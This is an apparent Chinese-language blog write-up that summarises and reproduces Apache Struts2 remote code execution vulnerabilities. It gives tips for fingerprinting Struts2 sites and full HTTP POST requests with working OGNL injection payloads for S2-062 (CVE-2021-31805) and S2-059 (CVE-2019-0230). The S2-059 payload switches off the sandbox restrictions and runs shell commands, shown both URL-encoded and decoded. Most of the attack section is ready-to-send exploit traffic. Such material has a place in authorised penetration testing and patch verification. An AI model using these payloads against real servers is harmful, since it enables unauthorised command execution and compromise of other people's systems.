[Struts2框架漏洞总结与复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/283821.html)

### 指纹

默认情况下，st2框架中存在http://192.168.xx.xx/struts/webconsole.html

网站文件后缀为.action或.do（.do不准确）

工具：fox工具箱中的Strusts2全版本漏洞检测工具-天融信

攻击流量可能存在OGNL表达注入扩展：

（%一堆JAVA代码

或者：#(#java代码

### 062远程代码执行(CVE-2021-31805)

##### 版本

2.0.0 <= Apache Struts2 <= 2.5.29

##### 利用

[Struts2 S2-062(CVE-2021-31805)漏洞分析及复现-CSDN博客](https://blog.csdn.net/qq_32261191/article/details/124287798)

工具利用

测试数据包：

```
POST / HTTP/1.1
Host: x.x.x.x:58080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=node01s6jfwzu7jiaso84yeylhndzq2863.node0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1045

id=%25{(%23request.map%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map.setBean(%23request.get('struts.valueStack'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.map2%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map2.setBean(%23request.get('map').get('context'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.map3%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b(%23request.map3.setBean(%23request.get('map2').get('memberAccess'))+%3d%3d+true).toString().substring(0,0)+%2b(%23request.get('map3').put('excludedPackageNames',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b(%23request.get('map3').put('excludedClasses',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b(%23application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))}
```

测试结果：

![image_xt2jzsCmWR58o2766sJaHZ.png](https://i-blog.csdnimg.cn/blog_migrate/d05a0c248cbf21f8c6a9ae9e302dbac7.png)

### 059代码执行（CVE-2019-0230）

##### 原理

OGNL表达式设置OgnlContext的_memberAccess变量绕过沙盒

##### 利用

1.请求体输入ONGL表达式%{1+4}，需要url转码%25%7b%31%2b%34%7d%0a，回显结果为5说明存在该漏洞

2.提交构造好的post请求数据包：

```
POST /s2_059/index.action HTTP/1.1
Host: localhost:8085
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 606
Origin: http://localhost:8085
Connection: close
Referer: http://localhost:8085/s2_059_war/
Cookie: JSESSIONID=272825C954147516F847095B055202B5; JSESSIONID=01F82222F5CCED3DC9B7819AE6C98DA0
Upgrade-Insecure-Requests: 1

payload=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d

```

payload里面的密文是经过url转码的，原文如下

```
%{#_memberAccess.allowPrivateAccess=true,#_memberAccess.allowStaticMethodAccess=true,#_memberAccess.excludedClasses=#_memberAccess.acceptProperties,#_memberAccess.excludedPackageNamePatterns=#_memberAccess.acceptProperties,#res=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=@java.lang.Runtime@getRuntime(),#s=new java.util.Scanner(#a.exec('ls -al').getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#res.print(#str),#res.close()
}
```

### 061代码执行（CVE-2020-17530）

一样的，都是post请求体里面加OGNL表达式，里面是经过base64+url编码加密的命令
